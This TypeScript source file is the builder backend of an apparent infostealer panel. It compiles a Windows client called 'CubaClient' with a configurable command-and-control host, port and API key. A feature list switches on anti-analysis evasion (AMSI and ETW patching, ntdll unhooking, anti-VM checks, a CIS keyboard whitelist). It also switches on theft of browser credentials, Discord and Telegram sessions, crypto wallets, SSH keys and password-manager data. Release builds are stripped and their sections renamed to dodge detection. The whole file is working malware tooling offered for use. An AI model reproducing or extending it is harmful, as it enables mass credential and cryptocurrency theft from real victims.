import { authMiddleware } from '@/middleware/auth.middleware'
import { roleMiddleware } from '@/middleware/role.middleware'
import { postprocess } from '@/utils/postprocess'
import { Hono } from 'hono'
import { cpus } from 'os'
import { existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'fs'
import { join } from 'path'

const CLIENT_DIR = process.env.CLIENT_DIR ?? ''
const DIST_DIR   = join(import.meta.dir, '../../dist')
const ENV_PATH   = join(import.meta.dir, '../../.env')
const STRIP      = 'x86_64-w64-mingw32-strip'
const OBJCOPY    = 'x86_64-w64-mingw32-objcopy'

function updateEnvFile(updates: Record<string, string>) {
    const content = existsSync(ENV_PATH) ? readFileSync(ENV_PATH, 'utf8') : ''
    const lines   = content.split('\n')
    const touched = new Set<string>()

    const out = lines.map(line => {
        const eq = line.indexOf('=')
        if (eq === -1) return line
        const key = line.slice(0, eq)
        if (updates[key] !== undefined) { touched.add(key); return `${key}=${updates[key]}` }
        return line
    })

    for (const [k, v] of Object.entries(updates)) {
        if (!touched.has(k)) out.push(`${k}=${v}`)
    }

    writeFileSync(ENV_PATH, out.join('\n'))
    for (const [k, v] of Object.entries(updates)) process.env[k] = v
}

export const FEATURES = [
    { key: 'ANTIVM',             label: 'Anti-VM check',               group: 'evasion'  },
    { key: 'ANTITARG',           label: 'CIS keyboard whitelist',      group: 'evasion'  },
    { key: 'ANALYST_PATH_CHECK', label: 'Analyst path detection',      group: 'evasion'  },
    { key: 'PPID_SPOOF',         label: 'PPID spoofing',               group: 'evasion'  },
    { key: 'ETW_PATCH',          label: 'ETW patching',                group: 'evasion'  },
    { key: 'AMSI_PATCH',         label: 'AMSI patching',               group: 'evasion'  },
    { key: 'UNHOOK',             label: 'ntdll unhooking',             group: 'evasion'  },
    { key: 'CHROMIUM',           label: 'Chromium credential theft',   group: 'stealing' },
    { key: 'GECKO',              label: 'Gecko credential theft',      group: 'stealing' },
    { key: 'DISCORD',            label: 'Discord token theft',         group: 'stealing' },
    { key: 'TELEGRAM',           label: 'Telegram session theft',      group: 'stealing' },
    { key: 'WIFI',               label: 'WiFi passwords',              group: 'stealing' },
    { key: 'SSH',                label: 'SSH keys',                    group: 'stealing' },
    { key: 'CLIPBOARD',          label: 'Clipboard',                   group: 'stealing' },
    { key: 'NOTEPADPP',          label: 'Notepad++ backups',           group: 'stealing' },
    { key: 'EXTENSIONS',         label: 'Browser extensions + 2FA',   group: 'stealing' },
    { key: 'CRYPTO',             label: 'Crypto wallets',              group: 'stealing' },
    { key: 'FTP',                label: 'FTP clients',                 group: 'stealing' },
    { key: 'GAMING',             label: 'Gaming platforms',            group: 'stealing' },
    { key: 'VPN',                label: 'VPN configs',                 group: 'stealing' },
    { key: 'COLDWALLET',         label: 'Cold wallet seed scanning',   group: 'stealing' },
    { key: 'MAIL',               label: 'Email clients',               group: 'stealing' },
    { key: 'DEVTOOLS',           label: 'Dev tools',                   group: 'stealing' },
    { key: 'CREDENTIALS',        label: 'Windows CredMan + PuTTY/RDP', group: 'stealing' },
    { key: 'SCREENSHOT',         label: 'Screenshot on first run',     group: 'stealing' },
    { key: 'PASSWORD_MANAGERS',  label: 'KeePass/Bitwarden/1Password', group: 'stealing' },
] as const

export type FeatureKey = typeof FEATURES[number]['key']

export interface BuildConfig {
    buildType:  'release' | 'debug'
    c2Host:     string
    c2Port:     string
    apiKey:     string
    zipPass:    string
    features:   Partial<Record<FeatureKey, boolean>>
}

interface BuildState {
    status:    'idle' | 'building' | 'done' | 'error'
    log:       string
    zipPass:   string | null
    buildType: 'release' | 'debug' | null
    filename:  string | null
}

let state: BuildState = {
    status:    'idle',
    log:       '',
    zipPass:   null,
    buildType: null,
    filename:  null,
}

async function exec(args: string[], cwd?: string): Promise<{ ok: boolean; output: string }> {
    const proc = Bun.spawn(args, { cwd, stdout: 'pipe', stderr: 'pipe' })
    const [out, err, code] = await Promise.all([
        new Response(proc.stdout).text(),
        new Response(proc.stderr).text(),
        proc.exited,
    ])
    return { ok: code === 0, output: (out + err).trim() }
}

async function doBuild(cfg: BuildConfig) {
    mkdirSync(DIST_DIR, { recursive: true })

    const preset   = cfg.buildType
    const buildDir = join(CLIENT_DIR, 'build', preset)
    const log      = (s: string) => { state.log += s + '\n' }

    if (existsSync(buildDir)) rmSync(buildDir, { recursive: true })

    const featureFlags = FEATURES.map(f =>
        `-DFEATURE_${f.key}=${cfg.features[f.key] !== false ? 'ON' : 'OFF'}`
    )

    log('[cmake configure]')
    const configure = await exec([
        'cmake', '--preset', preset, '-S', CLIENT_DIR,
        `-DC2_HOST=${cfg.c2Host}`,
        `-DC2_PORT=${cfg.c2Port}`,
        `-DC2_API_KEY=${cfg.apiKey}`,
        `-DZIP_PASS=${cfg.zipPass}`,
        ...featureFlags,
    ])
    if (configure.output) log(configure.output)
    if (!configure.ok) { state.status = 'error'; return }

    log('\n[cmake build]')
    const build = await exec(['cmake', '--build', buildDir, `-j${cpus().length || 4}`])
    if (build.output) log(build.output)
    if (!build.ok) { state.status = 'error'; return }

    const rawExe   = join(buildDir, 'CubaClient.exe')
    const filename = preset === 'debug' ? 'CubaClient_debug.exe' : 'CubaClient.exe'
    const outExe   = join(DIST_DIR, filename)

    rmSync(outExe, { force: true })

    if (preset === 'release') {
        log('\n[strip]')
        const strip = await exec([STRIP, '--strip-all', rawExe])
        if (strip.output) log(strip.output)
        if (!strip.ok) { state.status = 'error'; return }

        log('[objcopy — rename sections]')
        const objcopy = await exec([OBJCOPY,
            '--rename-section', '.text=.ndata',
            '--rename-section', '.rdata=.mdata',
            rawExe, outExe,
        ])
        if (objcopy.output) log(objcopy.output)
        if (!objcopy.ok) { state.status = 'error'; return }

        log('[postprocess — randomize timestamp, junk overlay, checksum]')
        postprocess(outExe)
    } else {
        await Bun.write(outExe, Bun.file(rawExe))
    }

    state.filename = filename
    state.status   = 'done'
    log('\nbuild complete')
}

export const builder = new Hono()

builder.get('/features', authMiddleware, roleMiddleware('admin'), (c) => {
    return c.json({
        features: FEATURES,
        apiKey:   process.env.CUBACLIENT_API_KEY  ?? '',
        zipPass:  process.env.CUBACLIENT_ZIP_PASS ?? '',
    })
})

builder.patch('/env', authMiddleware, roleMiddleware('admin'), async (c) => {
    const body = await c.req.json() as { apiKey?: string; zipPass?: string }
    const updates: Record<string, string> = {}
    if (body.apiKey)  updates['CUBACLIENT_API_KEY']  = body.apiKey
    if (body.zipPass) updates['CUBACLIENT_ZIP_PASS'] = body.zipPass
    if (!Object.keys(updates).length) return c.json({ message: 'nothing to update' }, 400)
    updateEnvFile(updates)
    return c.json({ ok: true })
})

builder.get('/state', authMiddleware, roleMiddleware('admin'), (c) => {
    return c.json(state)
})

builder.post('/build', authMiddleware, roleMiddleware('admin'), async (c) => {
    if (state.status === 'building') {
        return c.json({ message: 'build already in progress' }, 409)
    }
    if (!CLIENT_DIR) {
        return c.json({ message: 'CLIENT_DIR not set in .env' }, 500)
    }

    const cfg = await c.req.json() as BuildConfig

    if (!cfg.c2Host || !cfg.c2Port || !cfg.apiKey || !cfg.zipPass || !cfg.buildType) {
        return c.json({ message: 'c2Host, c2Port, apiKey, zipPass and buildType are required' }, 400)
    }

    state = {
        status:    'building',
        log:       '',
        zipPass:   cfg.zipPass,
        buildType: cfg.buildType,
        filename:  null,
    }

    doBuild(cfg).catch((err) => {
        state.status = 'error'
        state.log   += `\nfatal: ${err instanceof Error ? err.message : String(err)}`
    })

    return c.json({ message: 'build started' }, 202)
})

builder.get('/download', authMiddleware, roleMiddleware('admin'), async (c) => {
    if (!state.filename) return c.json({ message: 'no build available' }, 404)

    const file = Bun.file(join(DIST_DIR, state.filename))
    if (!await file.exists()) return c.json({ message: 'binary missing on disk' }, 404)

    return new Response(file, {
        headers: {
            'Content-Disposition': `attachment; filename="${state.filename}"`,
            'Content-Type': 'application/octet-stream',
        }
    })
})
